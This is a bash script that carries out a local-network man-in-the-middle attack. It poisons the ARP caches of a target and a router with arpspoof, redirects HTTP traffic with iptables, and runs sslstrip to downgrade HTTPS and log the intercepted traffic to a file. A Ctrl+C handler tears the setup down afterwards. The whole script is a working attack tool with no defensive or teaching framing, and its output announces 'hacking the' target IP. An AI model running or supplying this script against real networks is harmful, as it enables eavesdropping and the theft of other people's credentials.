#!/bin/bash

clear_firewall(){
	iptables -F
	iptables -t nat -F
	echo 0 > /proc/sys/net/ipv4/ip_forward
	echo 'The iptables and ip_forward clear is complete'
}

spin()
{
  spinner="/|\\-/|\\-"
  while :
  do
    for i in `seq 0 7`
    do
      echo -n "${spinner:$i:1}"
      echo -en "\010"
      sleep 1
    done
  done
}

kill_processes(){
	killall arpspoof
	echo 'kill arpspoof'
	killall sslstrip
	echo 'kill sslstrip'
	chk_process_command="ps uax | grep -e sslstrip -e arpspoof | grep -v grep | wc -l"

	# check to kill process
	echo "Checking to see if the process was killed."
	spin &
	SPIN_PID=$!
	while [ $(sh -c "$chk_process_command") -ne 0 ]
	do
		sleep 1
	done
	kill -9 $SPIN_PID
	echo "The process kill is complete."
}
if [ ${EUID:-${UID}} -ne 0 ]; then
	echo "Require root privilege"
	exit 1
fi

if [ $# -ne 3 ];then
	echo $0 interface_name target_ip router_ip
	exit 1
fi
interface_name=$1
target_ip=$2
router_ip=$3

echo 1 > /proc/sys/net/ipv4/ip_forward
#iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 10000
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sleep 1
arpspoof -i $interface_name -t $target_ip $router_ip &> /dev/null &
sleep 1
arpspoof -i $interface_name -t $router_ip $target_ip &> /dev/null &
sleep 1
sslstrip -f -a -k -l 10000 -w /root/sslstrip.txt &> /dev/null &

echo "hacking the "$target_ip
spin &
SPIN_PID2=$!

# trap Ctrl+C
trap '
kill -9 '"$SPIN_PID2"'
kill_processes
clear_firewall
echo "SIGINT"
exit
' SIGINT

while true
do
	sleep 1
done
